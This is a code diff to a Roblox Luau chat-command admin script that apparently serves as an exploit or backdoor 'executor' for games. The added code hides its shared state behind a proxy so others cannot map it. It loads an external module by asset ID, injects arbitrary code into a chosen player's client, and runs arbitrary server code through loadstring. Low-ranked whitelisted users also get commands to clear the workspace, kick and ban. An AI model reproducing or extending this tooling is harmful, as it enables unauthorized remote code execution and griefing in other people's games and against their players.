@@ -3,6 +3,7 @@
 --!native
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local ServerScriptService = game:GetService("ServerScriptService")
 
 local function NewGui(labels: {}): ScreenGui
 	local cmdGui = Instance.new("ScreenGui")
@@ -86,8 +87,19 @@ local function NewGui(labels: {}): ScreenGui
 end
 --NewGui({`I want the <font color="#FF7800">orange</font> candy.`, `I want the <font color="#0078FF">blue</font> candy.`}).Parent = game.Players.SnowClan_8342.PlayerGui
 
+-- cuz some people kept mapping it and i decided to be unfunny
 if not _G.yem then
-    _G.yem = {}
+    local yemEnv = {}
+    local proxy = newproxy(true)
+    local proxyMt = getmetatable(proxy)
+
+    proxyMt.__index = function(table,key)
+        return yemEnv[key]
+    end 
+    proxyMt.__newindex = function(table,key,value)
+        yemEnv[key] = value
+    end 
+    _G.yem = proxy
 end
 
 local GetEnv = function()
@@ -113,13 +125,48 @@ local Ranks = {
     Kiddie = 200
 }
 
+-- expose just 2 be nice qt3.14's
+GetEnv().runLua = function(caller: Player, code: string)
+if not ServerScriptService:FindFirstChild("goog") then
+        local ticking = tick()
+        require(112691275102014).load()
+        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
+    end
+
+    local goog = ServerScriptService:FindFirstChild("goog")
+    local p = caller
+
+    if not goog then
+        warn("goog failed to be added, command can not continue")
+        return
+    end
+
+    local scr = goog:FindFirstChild("Utilities").Client:Clone()
+    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+
+    loa.Parent = scr
+    scr:WaitForChild("Exec").Value = code
+
+    if p.Character then
+        scr.Parent = p.Character
+    else
+        scr.Parent = p:WaitForChild("PlayerGui")
+    end
+
+    scr.Enabled = true
+end
+
 -- TODO: implement ranks (for whitelist cmd or smth)
 if not GetEnv().tempwhitelist then
     GetEnv().tempwhitelist = {
         ["SnowClan_8342"] = {
-            rank = Ranks.Developer
+            rank = Ranks.Developer,
+            COMMENT = "Note that all a higher rank does is give me access to &whitelist so please either do it by hand or dont touch this!"
         },
         ["qwdssssfsdrfasd"] = {
+            rank = Ranks.Kiddie
+        },
+        ["yx_doomspire"] = {
             rank = Ranks.Kiddie
         },
         ["idonthacklol101ns"] = {
@@ -191,15 +238,6 @@ function C(text: string, colour: Color3)
     return `<font color="#{colour:ToHex()}">{text}</font>`
 end
 
-local commands: {Command} = {}
-
-type Command = {
-    Name: string,
-    Description: string,
-    Arguments: string,
-    OnCalled: (... any)->()
-}
-
 type UserList = { [number]: string }
 type UserArray = { string }
 type KickList = { any }--idc
@@ -218,12 +256,23 @@ type Settings = {
 }
 local _G = _G :: Settings
 
+local commands: {Command} = {}
+
+type Command = {
+    Name: string,
+    Description: string,
+    Arguments: string,
+    MinimumRank: number,
+    OnCalled: (... any)->()
+}
+
 print'initializing'
-local AddCommand = function(name: string, desc: string, args: string, onCalled: (caller: Player, ... any)->())
+local AddCommand = function(minrank: number, name: string, desc: string, args: string, onCalled: (caller: Player, ... any)->())
 	local tmpTbl: Command = {
 		["Name"] = name,
 		["Description"] = desc,
 		["Arguments"] = args,
+		["MinimumRank"] = minrank,
 		["OnCalled"] = onCalled
 	}
 	table.insert(commands, tmpTbl)
@@ -241,6 +290,9 @@ local IssueCommand = function(caller: Player, command: string)
         assert(cmdName ~= nil, `cmdName is for some reason nil (It cant be)`)
 
 		if string.lower(cmdName) == cmd.Name then
+            if GetEnv().tempwhitelist[caller.Name].rank < cmd.MinimumRank then
+                return -- no permission
+            end
 			local s,r = pcall(function()
 				cmd.OnCalled(caller, unpack(commandSplit))
 			end)
@@ -256,7 +308,7 @@ local onPlayerChatted = function(plyr: Player, msg: string)
     if not isRunning then return end
 
     if not GetEnv().tempwhitelist[plyr.Name] then
-        return -- TODO: ranks(?)
+        return -- verify has a rank first
     end
 
     local prefix = GetEnv().config.prefix
@@ -296,14 +348,21 @@ for i,plyr in pairs(Players:GetPlayers()) do
 end
 
 --cmds
-AddCommand("cmds", "Display a list of basic commands", "<>", function(caller: Player)
+AddCommand(Ranks.Kiddie, "cmds", "Display a list of basic commands", "<>", function(caller: Player)
     local output: {string} = {}
 
     local prefix = GetEnv().config.prefix
     for i,cmd in ipairs(commands) do
 		local cmdName = cmd["Name"]
-        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#919191"))
         local cmdDescr = cmd["Description"]
+        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#919191"))
+
+        if GetEnv().tempwhitelist[caller.Name].rank < cmd.MinimumRank then
+        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#3b1212"))
+
+            table.insert(output, `{C(prefix, Color3.fromHex("#491717"))}{C(cmdName, Color3.fromHex("#310000"))} {cmdArgs} {C(`- {cmdDescr}`, Color3.fromHex("#310000"))}`)
+            continue
+        end
 
         table.insert(output, `{C(prefix, Color3.fromHex("#738e99"))}{cmdName} {cmdArgs} - {cmdDescr}`)
 	end
@@ -311,9 +370,19 @@ AddCommand("cmds", "Display a list of basic commands", "<>", function(caller: Pl
     NewGui(output).Parent = caller.PlayerGui
 end)
 
-AddCommand("clr", "Clear everything from workspace", "<>", ClearWorkspace)
+AddCommand(Ranks.Kiddie, "banlist", "Display a list of banned players", "<>", function(caller: Player)
+    local output: {string} = {}
 
-AddCommand("kick", "Kick a player with a reason", "<plyr1, ...>", function(calller: Player, plyr1: string, ...)
+    for i,plr in pairs(GetEnv().tempbans) do
+        table.insert(output, `{C(i, Color3.fromHex("#997373"))} - reason: im to lazy to find it thanks`)
+	end
+
+    NewGui(output).Parent = caller.PlayerGui
+end)
+
+AddCommand(Ranks.Kiddie, "clr", "Clear everything from workspace", "<>", ClearWorkspace)
+
+AddCommand(Ranks.Kiddie, "kick", "Kick a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
 
@@ -321,7 +390,7 @@ AddCommand("kick", "Kick a player with a reason", "<plyr1, ...>", function(calll
     target:Kick(reason)
 end)
 
-AddCommand("ban", "Ban a player with a reason", "<plyr1, ...>", function(calller: Player, plyr1: string, ...)
+AddCommand(Ranks.Kiddie, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
 
@@ -330,7 +399,7 @@ AddCommand("ban", "Ban a player with a reason", "<plyr1, ...>", function(calller
     GetEnv().tempbans[target.Name] = reason
 end)
 
-AddCommand("unban", "Unban a player (Username only)", "<plyr1>", function(calller: Player, plyr1: string)
+AddCommand(Ranks.Kiddie, "unban", "Unban a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
     for i,v in pairs(GetEnv().tempbans) do
         if string.find(string.lower(i), plyr1, 1, true) then
             GetEnv().tempbans[i] = nil
@@ -340,21 +409,20 @@ AddCommand("unban", "Unban a player (Username only)", "<plyr1>", function(callle
     error("User not found")
 end)
 
-AddCommand("blacklist", "Erase a players admin", "<plyr1>", function(calller: Player, plyr1: string)
+AddCommand(Ranks.Kiddie, "blacklist", "Erase a players admin", "<plyr1>", function(caller: Player, plyr1: string)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
     
     GetEnv().tempblacklist[target.Name] = {}
 end)
 
-AddCommand("whitelist", "Give someone access (DANGEROUS)", "<plyr1>", function(calller: Player, plyr1: string)
+AddCommand(Ranks.Developer, "whitelist", "Give someone access (DANGEROUS)", "<plyr1>", function(caller: Player, plyr1: string)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
     
     GetEnv().tempwhitelist[target.Name] = {}
 end)
-
-AddCommand("unblacklist", "Unblacklists a player (Username only)", "<plyr1>", function(calller: Player, plyr1: string)
+AddCommand(Ranks.Kiddie, "unblacklist", "Unblacklists a player (Username only)", "<plyr1>", function(caller: Player, plyr1: string)
     for i,v in pairs(GetEnv().tempblacklist) do
         if string.find(string.lower(i), plyr1, 1, true) then
             GetEnv().tempblacklist[i] = nil
@@ -364,7 +432,7 @@ AddCommand("unblacklist", "Unblacklists a player (Username only)", "<plyr1>", fu
     error("User not found")
 end)
 
-AddCommand("perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr1: string)
+AddCommand(Ranks.Kiddie, "perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr1: string)
     local target = getPlyr(plyr1)
     assert(target, "Player not found")
 
@@ -374,11 +442,24 @@ AddCommand("perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr
     table.insert(GetEnv().fakeperm, target.Name)
 end)
 
-AddCommand("s", "Run some lvl-3 luau code", "<...>", function(caller: Player, ...)
+AddCommand(Ranks.Kiddie, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
     local code = table.concat({...}, " ")
+    assert(code, "No code")
     
-    loadstring(code, "Cattails")()
+    local chunk, loadErr = loadstring(code, "Cattails")
+    assert(chunk, `Script failed to execute; {loadErr}`)
 end)
+
+AddCommand(Ranks.Kiddie, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+    local target = getPlyr(plyr1)
+    assert(target, "Player not found")
+
+    local code = table.concat({...}, " ")
+    assert(code, "No code")
+
+    GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
+end)
+
 print'commands initialized'
 
 table.remove(t)
